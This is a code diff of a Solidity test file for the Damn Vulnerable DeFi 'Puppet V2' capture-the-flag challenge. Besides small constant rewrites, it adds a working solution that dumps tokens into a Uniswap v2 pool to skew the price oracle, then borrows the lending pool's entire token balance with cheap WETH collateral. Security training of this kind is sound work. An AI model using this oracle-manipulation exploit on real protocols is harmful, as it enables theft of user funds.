@@ -12,13 +12,13 @@ import {sl} from "@solc-log/sl.sol";
 /// https://www.damnvulnerabledefi.xyz/challenges/puppet-v2/
 contract PuppetV2Test is BaseTest {
   // Uniswap v2 pool will start with 100 tokens and 10 WETH in liquidity
-  uint256 public constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
+  uint256 public constant UNISWAP_INITIAL_TOKEN_RESERVE = 100 ether;
   uint256 public constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;
 
-  uint256 public constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
+  uint256 public constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000 ether;
   uint256 public constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;
 
-  uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+  uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000 ether;
 
   IUniswapV2Pair internal _uniswapV2Pair;
   IUniswapV2Factory internal _uniswapV2Factory;
@@ -83,6 +83,21 @@ contract PuppetV2Test is BaseTest {
 
   function testPuppetV2() public {
     /** CODE YOUR SOLUTION HERE */
+    vm.startPrank(player);
+
+    _token.approve(address(_uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+
+    address[] memory path = new address[](2);
+    path[0] = address(_token);
+    path[1] = address(_weth);
+
+    _uniswapV2Router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp);
+    
+    uint256 wethCollateral = _puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+    _weth.deposit{value: wethCollateral}();
+    _weth.approve(address(_puppetV2Pool), wethCollateral);
+
+    _puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
     // Attacker has taken all tokens from the pool
